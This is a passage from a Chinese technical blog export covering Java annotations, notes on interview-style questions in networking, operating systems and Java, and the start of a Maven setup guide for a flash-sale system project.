<h3 id="2-3-3-特殊属性value"><a href="#2-3-3-特殊属性value" class="headerlink" title="2.3.3 特殊属性value"></a>2.3.3 特殊属性value</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    特殊属性value</span></span><br><span class="line"><span class="comment">        * 如果注解中只有一个属性且名字叫value，则在使用该注解时可以直接给该属性赋值，而不需要给出属性名。</span></span><br><span class="line"><span class="comment">        * 如果注解中除了value属性之外还有其他属性且只要有一个属性没有默认值，则在给属性赋值时</span></span><br><span class="line"><span class="comment">            value属性名也不能省略了。</span></span><br><span class="line"><span class="comment">    小结：如果注解中只有一个属性时，一般都会将该属性名命名为value</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@interface</span> TestA&#123;</span><br><span class="line">   String[] value();</span><br><span class="line">   <span class="function"><span class="keyword">int</span> <span class="title">age</span><span class="params">()</span> <span class="keyword">default</span> 100</span>;</span><br><span class="line">   <span class="function">String <span class="title">name</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@interface</span> TestB&#123;</span><br><span class="line">    <span class="function">String <span class="title">name</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@TestB</span>(name = <span class="string">"zzz"</span>)</span><br><span class="line"><span class="meta">@TestA</span>(name = <span class="string">"yyy"</span>,value = &#123;<span class="string">"xxx"</span>,<span class="string">"xxx"</span>&#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AnnotationDemo02</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-4-注解之元注解"><a href="#2-4-注解之元注解" class="headerlink" title="2.4 注解之元注解"></a>2.4 注解之元注解</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">元注解概述</span><br><span class="line">    * Java官方提供的注解</span><br><span class="line">    * 用来定义注解的注解</span><br><span class="line">    * 任何官方提供的非元注解的定义都使用到了元注解。</span><br><span class="line"></span><br><span class="line">常用的元注解</span><br><span class="line">    * <span class="meta">@Target</span></span><br><span class="line">        * 作用：用来标识注解使用的位置，如果没有使用该注解标识，则自定义的注解可以使用在任意位置。</span><br><span class="line">        * 可使用的值定义在ElementType枚举类中，常用值如下</span><br><span class="line">            TYPE，类，接口</span><br><span class="line">            FIELD, 成员变量</span><br><span class="line">            METHOD, 成员方法</span><br><span class="line">            PARAMETER, 方法参数</span><br><span class="line">            CONSTRUCTOR, 构造方法</span><br><span class="line">            LOCAL_VARIABLE, 局部变量</span><br><span class="line"></span><br><span class="line">    * <span class="meta">@Retention</span></span><br><span class="line">        * 作用：用来标识注解的生命周期(有效范围)</span><br><span class="line">        * 可使用的值定义在RetentionPolicy枚举类中，常用值如下</span><br><span class="line">            * SOURCE：注解只作用在源码阶段，生成的字节码文件中不存在</span><br><span class="line">            * CLASS：注解作用在源码阶段，字节码文件阶段，运行阶段不存在，默认值</span><br><span class="line">            * RUNTIME：注解作用在源码阶段，字节码文件阶段，运行阶段</span><br></pre></td></tr></table></figure>

<h2 id="2-5-注解解析"><a href="#2-5-注解解析" class="headerlink" title="2.5 注解解析"></a>2.5 注解解析</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">什么是注解解析</span><br><span class="line">      * 使用Java技术获得注解上数据的过程则称为注解解析。</span><br><span class="line">  与注解解析相关的接口</span><br><span class="line">      * Annotation: 注解类，该类是所有注解的父类。</span><br><span class="line">      * AnnotatedElement:该接口定义了与注解解析相关的方法</span><br><span class="line">           <span class="function">T <span class="title">getAnnotation</span><span class="params">(Class&lt;T&gt; annotationClass)</span> 根据注解类型获得对应注解对象</span></span><br><span class="line"><span class="function">           Annotation[]	<span class="title">getAnnotations</span><span class="params">()</span></span></span><br><span class="line"><span class="function">              * 获得当前对象上使用的所有注解，返回注解数组，包含父类继承的</span></span><br><span class="line"><span class="function">           Annotation[]	<span class="title">getDeclaredAnnotations</span><span class="params">()</span></span></span><br><span class="line"><span class="function">              * 获得当前对象上使用的所有注解，返回注解数组,只包含本类的</span></span><br><span class="line"><span class="function">           <span class="keyword">boolean</span>	<span class="title">isAnnotationPresent</span><span class="params">(Class&lt;Annotation&gt; annotationClass)</span></span></span><br><span class="line"><span class="function">              * 判断当前对象是否使用了指定的注解，如果使用了则返回<span class="keyword">true</span>，否则<span class="keyword">false</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">      获取注解数据的原理</span></span><br><span class="line"><span class="function">          * 注解作用在哪个成员上就会得该成员对应的对象来获得注解</span></span><br><span class="line"><span class="function">              * 比如注解作用成员方法，则要获得该成员方法对应的Method对象</span></span><br><span class="line"><span class="function">              * 比如注解作用在类上，则要该类的Class对象</span></span><br><span class="line"><span class="function">              * 比如注解作用在成员变量上，则要获得该成员变量对应的Field对象。</span></span><br><span class="line"><span class="function">          * Field,Method,Constructor，Class等类都是实现了AnnotatedElement接口</span></span><br></pre></td></tr></table></figure>

<h4 id="2-5-1-需求说明"><a href="#2-5-1-需求说明" class="headerlink" title="2.5.1 需求说明"></a>2.5.1 需求说明</h4><ol>
<li>定义注解Book，要求如下：<ul>
<li>包含属性：String value()   书名</li>
<li>包含属性：double price()  价格，默认值为 100</li>
<li>包含属性：String[] authors() 多位作者  </li>
<li>限制注解使用的位置：类和成员方法上</li>
<li>指定注解的有效范围：RUNTIME</li>
</ul>
</li>
<li>定义BookStore类，在类和成员方法上使用Book注解</li>
<li>定义TestAnnotation测试类获取Book注解上的数据</li>
</ol>
<h4 id="2-5-2-代码实现"><a href="#2-5-2-代码实现" class="headerlink" title="2.5.2 代码实现"></a>2.5.2 代码实现</h4><ol>
<li><strong>注解Book</strong></li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Target</span>(&#123;ElementType.METHOD,ElementType.TYPE&#125;)</span><br><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Book &#123;</span><br><span class="line">    <span class="function">String <span class="title">value</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">price</span><span class="params">()</span> <span class="keyword">default</span> 100</span>;</span><br><span class="line">    String[] authros();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>BookShelf类</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Book</span>(value = <span class="string">"红楼梦"</span>,authros = &#123;<span class="string">"曹雪芹"</span>&#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BookShelf</span>  </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Book</span>(value = <span class="string">"西游记"</span>,authros = &#123;<span class="string">"吴承恩"</span>,<span class="string">"白求恩"</span>&#125;,price = <span class="number">200</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">showBook</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><strong>TestAnnotation类</strong></li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    什么是注解解析</span></span><br><span class="line"><span class="comment">        * 使用Java技术获得注解上数据的过程则称为注解解析。</span></span><br><span class="line"><span class="comment">    与注解解析相关的接口</span></span><br><span class="line"><span class="comment">        * Annotation: 注解类，该类是所有注解的父类。</span></span><br><span class="line"><span class="comment">        * AnnotatedElement:该接口定义了与注解解析相关的方法</span></span><br><span class="line"><span class="comment">             T getAnnotation(Class&lt;T&gt; annotationClass) 根据注解类型获得对应注解对象</span></span><br><span class="line"><span class="comment">             Annotation[]	getAnnotations()</span></span><br><span class="line"><span class="comment">                * 获得当前对象上使用的所有注解，返回注解数组，包含父类继承的</span></span><br><span class="line"><span class="comment">             Annotation[]	getDeclaredAnnotations()</span></span><br><span class="line"><span class="comment">                * 获得当前对象上使用的所有注解，返回注解数组,只包含本类的</span></span><br><span class="line"><span class="comment">             boolean	isAnnotationPresent(Class&lt;Annotation&gt; annotationClass)</span></span><br><span class="line"><span class="comment">                * 判断当前对象是否使用了指定的注解，如果使用了则返回true，否则false</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        获取注解数据的原理</span></span><br><span class="line"><span class="comment">            * 注解作用在哪个成员上就会得该成员对应的对象来获得注解</span></span><br><span class="line"><span class="comment">                * 比如注解作用成员方法，则要获得该成员方法对应的Method对象</span></span><br><span class="line"><span class="comment">                * 比如注解作用在类上，则要该类的Class对象</span></span><br><span class="line"><span class="comment">                * 比如注解作用在成员变量上，则要获得该成员变量对应的Field对象。</span></span><br><span class="line"><span class="comment">            * Field,Method,Constructor，Class等类都是实现了AnnotatedElement接口</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AnnotationDemo04</span> </span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        获得类上使用的注解数据</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test02</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 获得Class对象</span></span><br><span class="line">        Class c = BookShelf<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">        <span class="comment">// 判断类上是否使用Book注解</span></span><br><span class="line">        <span class="keyword">if</span>(c.isAnnotationPresent(Book<span class="class">.<span class="keyword">class</span>))</span>&#123;</span><br><span class="line">            <span class="comment">// 根据注解的Class对象获得对应的注解对象</span></span><br><span class="line">            Book annotation = (Book) c.getAnnotation(Book<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            <span class="comment">// 获得书名</span></span><br><span class="line">            System.out.println(annotation.value());</span><br><span class="line">            <span class="comment">// 获得作者</span></span><br><span class="line">            System.out.println(Arrays.toString(annotation.authros()));</span><br><span class="line">            <span class="comment">// 获得价格</span></span><br><span class="line">            System.out.println(annotation.price());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获得当前对象上使用的所有注解，返回注解数组</span></span><br><span class="line">        <span class="comment">// Annotation[] annotations = c.getAnnotations();</span></span><br><span class="line">        Annotation[] annotations = c.getDeclaredAnnotations();</span><br><span class="line">        System.out.println(Arrays.toString(annotations));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       获得成员方法上注解的数据</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test01</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 获得Class对象</span></span><br><span class="line">        Class c = BookShelf<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">        <span class="comment">// 获得成员方法对应的Method对象</span></span><br><span class="line">        Method m = c.getMethod(<span class="string">"showBook"</span>);</span><br><span class="line">        <span class="comment">// 根据注解的Class对象获得对应的注解对象</span></span><br><span class="line">        Book annotation = m.getAnnotation(Book<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        <span class="comment">// 获得书名</span></span><br><span class="line">        System.out.println(annotation.value());</span><br><span class="line">        <span class="comment">// 获得作者</span></span><br><span class="line">        System.out.println(Arrays.toString(annotation.authros()));</span><br><span class="line">        <span class="comment">// 获得价格</span></span><br><span class="line">        System.out.println(annotation.price());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-6-注解案例"><a href="#2-6-注解案例" class="headerlink" title="2.6 注解案例"></a>2.6 注解案例</h2><h3 id="2-6-1-案例说明"><a href="#2-6-1-案例说明" class="headerlink" title="2.6.1 案例说明"></a>2.6.1 案例说明</h3><ul>
<li>模拟Junit测试的@Test</li>
</ul>
<h3 id="2-6-2-案例分析"><a href="#2-6-2-案例分析" class="headerlink" title="2.6.2 案例分析"></a>2.6.2 案例分析</h3><ol>
<li>模拟Junit测试的注释@Test，首先需要编写自定义注解@MyTest，并添加元注解，保证自定义注解只能修饰方法，且在运行时可以获得。</li>
<li>然后编写目标类（测试类），然后给目标方法（测试方法）使用 @MyTest注解，编写三个方法，其中两个加上@MyTest注解。</li>
<li>最后编写调用类，使用main方法调用目标类，模拟Junit的运行，只要有@MyTest注释的方法都会运行。</li>
</ol>
<h3 id="2-6-3-案例代码"><a href="#2-6-3-案例代码" class="headerlink" title="2.6.3 案例代码"></a>2.6.3 案例代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.annotation.ElementType;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.RetentionPolicy;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)</span><br><span class="line"><span class="meta">@Target</span>(ElementType.METHOD)</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> MyTest &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestMyTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@MyTest</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">tests01</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"test01"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">tests02</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"test02"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@MyTest</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">tests03</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"test03"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> pkxing</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> 1.0</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Package</span> com.itheima</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2018/6/23  下午9:10</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AnnotationDemo05</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 获得Class对象</span></span><br><span class="line">        Class c = TestMyTest<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">        Object obj = c.newInstance();</span><br><span class="line">        <span class="comment">// 获得所有成员方法</span></span><br><span class="line">        Method[] methods = c.getMethods();</span><br><span class="line">        <span class="keyword">for</span>(Method m:methods)&#123;</span><br><span class="line">            <span class="comment">// 判断m方法是否使用了MyTest注解</span></span><br><span class="line">            <span class="keyword">if</span>(m.isAnnotationPresent(MyTest<span class="class">.<span class="keyword">class</span>))</span>&#123;</span><br><span class="line">                <span class="comment">// 调用方法</span></span><br><span class="line">                m.invoke(obj);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Information Security Study</category>
        <category>Code Language</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>牛客网错题解析</title>
    <url>/hexo-test/Others/%E7%89%9B%E5%AE%A2%E7%BD%91%E9%94%99%E9%A2%98%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h4 id="1、各种排序算法的时间复杂度及稳定性"><a href="#1、各种排序算法的时间复杂度及稳定性" class="headerlink" title="1、各种排序算法的时间复杂度及稳定性"></a>1、各种排序算法的时间复杂度及稳定性</h4><p><img data-src="https://i.loli.net/2021/01/23/eTNXsMx9DWCpk56.png" alt></p>
<a id="more"></a>

<h4 id="2、计算机处理的最小单位为“位”"><a href="#2、计算机处理的最小单位为“位”" class="headerlink" title="2、计算机处理的最小单位为“位”"></a>2、计算机处理的最小单位为“位”</h4><h4 id="3、传输层作用"><a href="#3、传输层作用" class="headerlink" title="3、传输层作用"></a>3、传输层作用</h4><p>传输层有几大功能：<strong>可靠传输（即差错控制）、流量控制，滑动窗口，拥塞控制</strong></p>
<p><strong>1）可靠传输</strong>：TCP 使用超时重传来实现可靠传输：如果一个已经发送的报文段在超时时间内没有收到确认，那么就重传这个报文段。</p>
<p><strong>2）滑动窗口</strong>：窗口是缓存的一部分，用来暂时存放字节流。发送方和接收方各有一个窗口，接收方通过 TCP 报文段中的窗口字段告诉发送方自己的窗口大小，发送方根据这个值和其它信息设置自己的窗口大小。接收窗口只会对窗口内最后一个按序到达的字节进行确认，这样发送方得到一个字节的确认之后，就知道这个字节之前的所有字节都已经被接收。<strong>滑动窗口可以用于控制发送端发送的速率，即接受方如果还没有接受，发送方就不能持续发送！</strong></p>
<p><strong>3）流量控制</strong>：通过滑动窗口实现，流量控制是为了控制发送方发送速率，保证接收方来得及接收。接收方发送的确认报文中的窗口字段可以用来控制发送方窗口大小，从而影响发送方的发送速率。将窗口字段设置为0，则发送方不能发送数据。</p>
<p><strong>4）拥塞控制：</strong>如果网络出现拥塞，分组将会丢失，此时发送方会继续重传，从而导致网络拥塞程度更高。因此当出现拥塞时，应当控制发送方的速率。这一点和流量控制很像，但是出发点不同。流量控制是为了让接收方能来得及接收，而拥塞控制是为了降低整个网络的拥塞程度。</p>
<p>TCP 主要通过四个算法来进行拥塞控制：<strong>慢开始、拥塞避免、快重传、快恢复。</strong></p>
<p><img data-src="https://i.loli.net/2021/01/23/FNOhR4726UqoigX.png" alt="img"></p>
<h4 id="4、OSI-模型"><a href="#4、OSI-模型" class="headerlink" title="4、OSI 模型"></a>4、OSI 模型</h4><p><strong>开放式系统互联通信参考模型</strong>（英语：Open System Interconnection Reference Model，缩写为 OSI）</p>
<p><img data-src="https://i.loli.net/2021/01/23/sqDC8oQak9ndvEY.jpg" alt="img"></p>
<h4 id="5、共享式和交换式局域网"><a href="#5、共享式和交换式局域网" class="headerlink" title="5、共享式和交换式局域网"></a>5、共享式和交换式局域网</h4><p>利用集线器连接的局域网叫共享式局域网，利用交换机连接的局域网叫交换式局域网。</p>
<p>以太网中采用的工作方式是CSMA／CD（载波监听多路访问／冲突检测）</p>
<p>共享和交换这两个概念。打个比方，10个车道的马路，车辆在无序的状态下抢道或占道通行，容易发生交通堵塞和反向行驶的车辆对撞，使通行能力降低，共享式网络。为了避免这种情况，在道路上标清行车线，保证每一辆车各行其道、互不干扰，是交换式网络。而交换式网络则避免了共享式网络的不足，交换技术的作用便是根据所传递信息包的目的地址，将每一信息包独立地从端口送至目的端口，避免了与其它端口发生碰撞，提高了网络的实际吞吐量。</p>
<p>共享式以太网存在的主要问题是所有用户共享带宽，每个用户的实际可用带宽随网络用户数的增加而递减。这是因为当信息繁忙时，多个用户都可能同进“争用”一个信道，而一个通道在某一时刻只充许一个用户占用，所以大量的经常处于监测等待状态，致使信号在传送时产生抖动、停滞或失真，严重影响了网络的性能。交换式以太网中，交换机供给每个用户专用的信息通道，除非两个源端口企图将信息同时发往同一目的端口，否则各个源端口与各自的目的端口之间可同时进行通信而不发生冲突。交换机只是在工作方式上与集线器不同，其它的连接方式、速度选择等则与集线器基本相同</p>
<h4 id="6、主要的作业调度算法"><a href="#6、主要的作业调度算法" class="headerlink" title="6、主要的作业调度算法"></a>6、主要的作业调度算法</h4><ul>
<li><strong>先来先服务调度</strong>：按照作业进入系统的时间先后挑选作业，先进入系统的作业优先被运行。</li>
<li><strong>短作业优先调度</strong>：参考运行时间，选取运行时间最短的作业投入运行。</li>
<li><strong>响应比高者优先调度</strong>：计算每个作业的响应比（响应时间/运行时间），选择响应比最高的作业优先投入运行。</li>
<li><strong>优先数调度算法</strong>：根据进程优先数（静态优先数+动态优先数），把CPU分配给最高的进程。</li>
<li><strong>循环轮转调度算法</strong>：把所有就绪进程按先进先出的原则排成队列，新来进程加入队列末尾，进程以时间片为单位轮流使用CPU，刚刚运行一个时间片的进程排到队列末尾，等候下一轮运行。</li>
</ul>
<h4 id="7、循环队列的相关条件和公式"><a href="#7、循环队列的相关条件和公式" class="headerlink" title="7、循环队列的相关条件和公式"></a>7、循环队列的相关条件和公式</h4><p><img data-src="https://i.loli.net/2021/01/23/3I7oqwW1N8cn5jp.png" alt="img"></p>
<h4 id="8、预防死锁的方法"><a href="#8、预防死锁的方法" class="headerlink" title="8、预防死锁的方法"></a>8、预防死锁的方法</h4><p><strong>资源一次性分配</strong>：破坏“请求与保持”条件；</p>
<p><strong>可剥夺资源：</strong>破坏“不可剥夺”条件；</p>
<p><strong>资源有序分配：</strong>破坏“循环等待”条件；</p>
<h4 id="9、程序状态字PSW（Program-Status-Word）"><a href="#9、程序状态字PSW（Program-Status-Word）" class="headerlink" title="9、程序状态字PSW（Program Status Word）"></a>9、程序状态字PSW（Program Status Word）</h4><p>包括的状态位有<strong>进位标志位（CF）</strong>、<strong>结果为零标志位（ZF）</strong>、<strong>符号标志位（SF）</strong>、<strong>溢出标志位（OF）</strong>、<strong>陷阱标志位（TF）</strong>、<strong>中断使能（中断屏蔽）标志位（IF）</strong>、<strong>虚拟中断标志位（VIF）</strong>、<strong>虚拟中断待决标志位（VIP）</strong>、<strong>I0特权级别（IOPL）</strong>。</p>
<p>通常的状态代码：CPU的工作状态码——指明管态还是目态，用来说明当前在CPU上执行的是操作系统还是一般用户，从而决定其是否可以使用特权指令或拥有其它的特殊权力。条件码——反映指令执行后的结果特征。中断屏蔽码——指出是否允许中断。</p>
<h4 id="10、3C"><a href="#10、3C" class="headerlink" title="10、3C"></a>10、3C</h4><p>所谓“3C产品”，就是计算机（Computer）、通信（Communication）和消费类电子产品（Consumer Electronics）三者结合，亦称“信息家电”。由于3C产品的体积一般都不大，所以往往在中间加一个“小”字，故往往统称为“3C小家电”。</p>
<h4 id="11、java标识符命名规则"><a href="#11、java标识符命名规则" class="headerlink" title="11、java标识符命名规则"></a>11、java标识符命名规则</h4><ul>
<li>Java 标识符有如下命名规则： <ul>
<li>由26个英文字母大小写，数字：0-9 符号：_ $ 组成</li>
<li>标识符应以字母、_ 、$开头。</li>
<li>标识符不能是关键字。</li>
</ul>
</li>
<li>Java中严格区分大小写 </li>
</ul>
<h4 id="12、try-catch"><a href="#12、try-catch" class="headerlink" title="12、try - catch"></a>12、try - catch</h4><p>catch可以省略，try的形式有三种：</p>
<p>try-catch</p>
<p>try-finally</p>
<p>try-catch-finally</p>
<p>但<strong>catch和finally语句不能同时省略！</strong></p>
<h4 id="13、关于数组复制效率问题"><a href="#13、关于数组复制效率问题" class="headerlink" title="13、关于数组复制效率问题"></a>13、关于数组复制效率问题</h4><ol>
<li>System.arraycopy()：native方法+JVM手写函数，在JVM里预写好速度最快</li>
<li>clone()：native方法，但并未手写，需要JNI转换，速度其次</li>
<li>Arrays.copyof()：本质是调用1的方法</li>
<li>for()：全是深复制，并且不是封装方法，最慢情有可原</li>
</ol>
<h4 id="14、四种引用类型"><a href="#14、四种引用类型" class="headerlink" title="14、四种引用类型"></a>14、四种引用类型</h4><p>JDK1.2 之前，一个对象只有“已被引用”和”未被引用”两种状态，这将无法描述某些特殊情况下的对象，比如，当内存充足时需要保留，而内存紧张时才需要被抛弃的一类对象。</p>
<p>所以在 JDK.1.2 之后，Java 对引用的概念进行了扩充，将引用分为了：强引用（Strong Reference）、软引用（Soft Reference）、弱引用（Weak Reference）、虚引用（Phantom Reference）4 种，这 4 种引用的强度依次减弱。</p>
<p><strong>一，强引用</strong></p>
<p>Object obj = new Object(); //只要obj还指向Object对象，Object对象就不会被回收 obj = null; //手动置null</p>
<p>只要强引用存在，垃圾回收器将永远不会回收被引用的对象，哪怕内存不足时，JVM也会直接抛出OutOfMemoryError，不会去回收。如果想中断强引用与对象之间的联系，可以显示的将强引用赋值为null，这样一来，JVM就可以适时的回收对象了</p>
<p><strong>二，软引用</strong></p>
<p>软引用是用来描述一些非必需但仍有用的对象。<strong>在内存足够的时候，软引用对象不会被回收，只有在内存不足时，系统则会回收软引用对象，如果回收了软引用对象之后仍然没有足够的内存，才会抛出内存溢出异常</strong>。这种特性常常被用来实现缓存技术，比如网页缓存，图片缓存等。</p>
<p>在 JDK1.2 之后，用java.lang.ref.SoftReference类来表示软引用。</p>
<p><strong>三，弱引用</strong></p>
<p>弱引用的引用强度比软引用要更弱一些，<strong>无论内存是否足够，只要 JVM 开始进行垃圾回收，那些被弱引用关联的对象都会被回收</strong>。在 JDK1.2 之后，用 java.lang.ref.WeakReference 来表示弱引用。</p>
<p><strong>四，虚引用</strong></p>
<p>虚引用是最弱的一种引用关系，如果一个对象仅持有虚引用，那么它就和没有任何引用一样，它随时可能会被回收，在 JDK1.2 之后，用 PhantomReference 类来表示，通过查看这个类的源码，发现它只有一个构造函数和一个 get() 方法，而且它的 get() 方法仅仅是返回一个null，也就是说将永远无法通过虚引用来获取对象，虚引用必须要和 ReferenceQueue 引用队列一起使用。</p>
<h4 id="15、树的遍历例题"><a href="#15、树的遍历例题" class="headerlink" title="15、树的遍历例题"></a>15、树的遍历例题</h4><p>某二叉树中序序列为A,B,C,D,E,F,G,后序序列为B,D,C,A,F,G,E则前序序列是()</p>
<p>  由后序序列和中序序列可以唯一确定一棵二叉树，这是由两种遍历序列的特点所决定的。</p>
<p>​    后序序列的最后一个节点是根节点，中序序列中根节点将序列分为左右子树的中序序列；在后序序列中找到左右子树的序列，其最后一个节点是左右子树的根节点，如此递归就能确定整个二叉树的形态。</p>
<p>​    其算法实现步骤如下：</p>
<ol>
<li>根据后序序***定树的根节点</li>
<li>根据根节点在中序序列中划分出二叉树的左、右子树包含哪些节点。然后根据左右子树节点在后序序列中的次序可以确定子树的根节点，即回到步骤 1.</li>
<li>如此重复上述步骤，知道每棵子树仅有一个节点为止，如下图所示。</li>
</ol>
<p><img data-src="https://i.loli.net/2021/01/23/n4M62U8yFN1I5vK.jpg" alt="img"></p>
<p> 从而前序遍历结果为： <strong>EACBDGF</strong></p>
<h4 id="16、方法重写的规则"><a href="#16、方法重写的规则" class="headerlink" title="16、方法重写的规则"></a>16、方法重写的规则</h4><p><strong>方法的重写（override）两同两小一大原则</strong>：</p>
<p>方法名相同，参数类型相同</p>
<p>子类返回类型小于等于父类方法返回类型，</p>
<p>子类抛出异常小于等于父类方法抛出异常，</p>
<p>子类访问权限大于等于父类方法访问权限。</p>
]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>Others</tag>
      </tags>
  </entry>
  <entry>
    <title>秒杀系统</title>
    <url>/hexo-test/Projects/%E7%A7%92%E6%9D%80%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>官网下载最新的压缩包解压即可，配置环境变量，新建一个变量</p>
<p><img data-src="https://i.loli.net/2021/01/23/N31sEJcXigZtrY2.png" alt="image-20210117124518118"></p>
<p>再在 path 目录下添加     <code>%MAVEN_HOME%\bin</code></p>
<p><img data-src="https://i.loli.net/2021/01/23/tHGLupCcBz1wSfD.png" alt="image-20210117124601374"></p>
<p>打开 powershell 输入 <code>mvn -version</code> 出现</p>
<p><img data-src="https://i.loli.net/2021/01/23/ciJdtu67rhxq1OS.png" alt="image-20210117124748760"></p>
<p>打开解压后的目录文件下的 conf 文件夹，修改其中的 settings.xml 配置文件</p>
<a id="more"></a>

<p>更改默认的本地仓库地址（目录自己新建）</p>
<p><img data-src="https://i.loli.net/2021/01/23/Y4K9OWMvedyf7qs.png" alt="image-20210117125028943"></p>
<p>更换镜像网站（提升下载速度）</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 注意添加到 mirrors 标签域内 --&gt;</span>	 </span><br><span class="line"><span class="comment">&lt;!--设置阿里云镜像--&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>alimaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>aliyun maven<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/repositories/central/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span 